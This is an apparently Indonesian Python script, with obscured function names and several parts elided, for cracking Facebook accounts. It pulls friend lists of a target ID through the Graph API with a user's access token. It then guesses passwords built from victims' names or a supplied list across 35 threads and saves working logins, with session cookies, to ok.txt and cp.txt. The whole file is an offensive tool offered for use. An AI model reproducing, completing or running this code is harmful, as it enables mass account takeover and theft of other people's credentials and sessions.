...
_____INFO______ = 'Gua ganteng ya?'
...
______Eaeaea______ = exit
def ________LOGOSCRIPTNYA__________():
	______SAYANGKAMU______("clear")
	______Asell______(f"""%s
{H} ____    ____   ______   ________  • Coded By 4se1L-XD •
|_   \  /   _|.' ____ \ |_   __  | • MASTERSIMPLEFORCE •
{K}  |   \/   |  | (___ \_|  | |_ \_| • Free•
  | |\  /| |   _.____`.   |  _|    
{B} _| |_\/_| |_ | \____) | _| |_     
...
def ___RecodeSampah__():
	try:
		...
		______Asell______(f" \n {P}[{H}!{P}] Token wajib EAAB \n {P}[{H}!{P}] Jika Token Tidak EAAB Maka Akan Gagal Dump")
		token = ______AsellCans______(f'{P} [{H}?{P}] Token : ')
		try:
			...
			______Asell______(" %s[%s•%s] USER PREMIUM "%(P,H,P));time.sleep(00.9)
			______Asell______(" %s[%s•%s] Expired : 27/12/98472 "%(P,H,P));time.sleep(00.9)
			______Asell______(" %s[%s•%s] ENTER "%(P,H,P));time.sleep(3)
			_____bot________();___SayaRecodeSampah___()
		except KeyError:
			______Asell______(f'{P} [{M}!{P}] Token Kadaluarsa')
			______Eaeaea______() 
...
def _____bot________():
	...
	______kom______ = ('Gweh cantik ya?') 
...
def __cekakun__():
    ...
    ______Asell______(f" {P}[{H}2{P}] Cek Hasil CP ")
    anjg = ______AsellCans______(f" \n {P}[{H}?{P}] Pilih : ")
    if anjg == '':
        ___SayaRecodeSampah___()
    elif anjg == '01' or anjg == '1':
        ______SAYANGKAMU______(' cat ok.txt')
        ______AsellCans______('\n [\xe2\x80\xa2] Kembali ')
        ___SayaRecodeSampah___()
        ...
        ______Asell______( ' [!] pilih yang benar!!')
        ___SayaRecodeSampah___()
def __upgrade__():
	______Asell______(' [!] Wait');time.sleep(3)
	______AsellCans______(' >>> Enter ')
	______SAYANGKAMU______('am start https://wa.me/+6285779828894?text=Assalamualaikum,+I+Want+Upgrade+To+Premium,+Please+Respon%20>/dev/null')
	______Eaeaea______('Selamat Tinggal')
...
def _____Publik_______():
	try:
		...
		______Eaeaea______()
	______Asell______(P+'\n ['+h+'•'+P+'] Ketik "me" Jika Ingin dum dari friendlist')
	pil = ______AsellCans______(P+' ['+h+'?'+P+'] Masukkan ID Target : ')
	try:
		koh = requests.get('https://graph.facebook.com/'+pil+'?access_token='+token)
		grex = json.loads(koh.text)['name']
		______Asell______(P+' ['+h+'•'+P+'] Nama  : '+str(grex))
	except (KeyError,IOError):
		______Asell______(P+' ['+h+'!'+P+'] ID USER TIDAK DITEMUKAN')
		______Eaeaea______()
	except requests.exceptions.ConnectionError:
		______Asell______(P+' ['+h+'!'+P+'] KONESI INTERNET TIDAK STABIL')
		______Eaeaea______()
	try:
		...
		______Asell______(P+' ['+h+'•'+P+'] Total : '+str(len(id)))
	except requests.exceptions.ConnectionError:
		______Asell______(P+' ['+h+'!'+P+'] KONEKSI INTERNET BERMASALAH')
		______Eaeaea______()
	except (KeyError,IOError):
		______Asell______(P+' ['+h+'!'+P+'] PERTEMANAN TARGET TIDAKLAH DIPUBLIKASIKAN')
		______Eaeaea______()
	______Asell______(f" \n {P}[{H}?{P}] apakah anda ingin menggunakan kata sandi manual? [Y/t] ")
	ask=______AsellCans______(" %s[%s?%s] %spilih :%s "%(p,H,p,p,p))
	if ask in[""]:
		______Eaeaea______(f" {P}[{H}!{P}] Pilihan Tidak Ada")
	elif ask in["t"]:
		_____LANGSUNG_____()
	elif ask in["y"]:
		____MANUAL_____()
...
def _____LANGSUNG_____():
	______Asell______("")
	______Asell______(' %s[%s+%s] %shasil %sOK %sdisimpan ke -> %sok.txt'%(p,p,p,p,p,p,H))
	______Asell______(' %s[%s+%s] %shasil %sCP %sdisimpan ke -> %scp.txt'%(p,p,p,p,p,p,K))
	______4se1L______(" %s[%s!%s] %sjika tidak %sada %shasil mode pesawatkan -> %s5 detik\n"%(p,M,p,p,p,p,p))
	with ThreadPoolExecutor(max_workers=35) as asell:
		for user in id:
			uid, name = user.split("|")
			nam = name.split(' ')
			if len(name) == 3 or len(name) == 4 or len(name) == 5:
				...
				pwx = [name, nam[0]+"123", nam[0]+"1234", nam[0]+"12345"]
			asell.submit(apii, uid, pwx)
		pass
	______Eaeaea______("\n\n [#] crack selesai...")
### MANUAL ###
def ____MANUAL_____():
	______Asell______(" %s[%s!%s] %sgunakan , (%skoma%s) sebagai pemisah"%(p,p,p,p,p,N))
	pwek=______AsellCans______(' %s[%s?%s] %sbuat kata sandi :%s '%(p,p,p,p,p,H))
	if pwek=="":
		______Eaeaea______(" %s[!] isi jawaban dengan benar!"%(M))
	elif len(pwek)<=5:
		______Eaeaea______(" %s[!] masukan sandi minimal 6 angka!"%(M))
		______Asell______(' %s[%s+%s] %shasil %sOK %sdisimpan ke -> %sok.txt'%(p,p,p,p,p,p,H))
		______Asell______(' %s[%s+%s] %shasil %sCP %sdisimpan ke -> %scp.txt'%(p,p,p,p,p,p,K))
		with ThreadPoolExecutor(max_workers=35) as asell:
			for user in id:
				uid, name = user.split("|")
				asell.submit(api, uid, pwek.split(","))
		______Eaeaea______("\n\n [#] crack selesai...")
def apii(uid, pwx):
	...
	for pw in pwx:
		...
		if "c_user" in ses.cookies.get_dict().keys():
			...
			______Asell______("\r %s[OK] %s • %s • %s         "%(H,uid, pw,kukis))
			...
			try:
				...
				month = bulan[month]
				______Asell______("\r %s\x1b[1;93m[CP] %s • %s • %s %s %s"%(K,uid, pw, day, month, year))
			...
			______Asell______("\r %s\x1b[1;93m[CP] %s • %s         "%(K,uid, pw))
			cp.append("%s • %s"%(uid, pw))
	...
	_______loop______ += 1
### SETTING USER AGENT / UA
def __useragent__():
	______Asell______(f" \n {P}[{H}1{P}] Ganti UserAgent Manual")
	______Asell______(f" {P}[{H}2{P}] Gunakan UserAgent Tools")
	ua = ______AsellCans______(f" {P}[{H}?{P}] Choose : ")
	if ua =="":
		______Eaeaea______(f" {P}[{H}!{P}] Pilihan Tidak Ada")
	elif ua == "1":
		c_ua = ______AsellCans______(f" \n {P}[{H}?{P}] Enter User-Agent : ")
		open(".ua", "w").write(c_ua)
		time.sleep(1)
		______AsellCans______(f" \n {P}[{H}✔{P}] Press Enter To Save User-Agent")
		___SayaRecodeSampah___()
	elif ua == "2":
		______Asell______("Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]")
...
def ___SayaRecodeSampah___():
	...
	try:
		...
		______Asell______(f'{P} [{H}!{P}] Token Invalid')
		______SAYANGKAMU______('clear')
		______SAYANGKAMU______('rm -rf login.txt')
		___RecodeSampah__()
	except requests.exceptions.ConnectionError:
		______Eaeaea______(f'{P} [{M}!{P}] No Connection')
	try:
		nama = requests.get('https://graph.facebook.com/me?access_token=%s'%(token)).json()['name']
		uid = requests.get('https://graph.facebook.com/me?access_token=%s'%(token)).json()['id']
	except KeyError:
		______SAYANGKAMU______('clear')
		______Asell______(f'{P} [{M}×{P}] Token Invalid')
		______SAYANGKAMU______('rm -rf login.txt')
		___RecodeSampah__()
	except requests.exceptions.ConnectionError:
		______Eaeaea______(f'{P} [{M}!{P}] No Connection')
	________LOGOSCRIPTNYA__________()
	______Asell______(f" {P}[{H}->{P}] Nama    : %s \n {P}[{H}->{P}] ID      : %s \n {P}[{H}->{P}] IP      : %s \n {P}[{H}->{P}] Status  : {H}Free{P}"%(nama,uid,_______IP_______))
	______Asell______(f" \n {P}[{H}1{P}] Crack Dari ID Publik \n {P}[{H}2{P}] Cek Hasil OK/CP \n {P}[{H}3{P}] Setting UserAgent \n {P}[{H}4{P}] Upgrade {H}Pro \n {P}[{H}0{P}] Keluar (Logout)")
	ask = ______AsellCans______(f" {P}[{U}?{P}] Pilih : ")
	if ask =="":______Eaeaea______(f" {P}[{H}!{P}] Pilihan Tidak Ada")
	...
	else:______Eaeaea______(f" {P}[{H}!{P}] Pilihan Tidak Ada")

if __name__ == '__main__':
	if sys.version[0]!="2":
		python="2.7" if "2.7" in sys.version[0:2] else "2.8"
	else:
		______Eaeaea______(" \033[0;97m[\033[0;91m!\033[0;97m] How To Usage : python run.py")
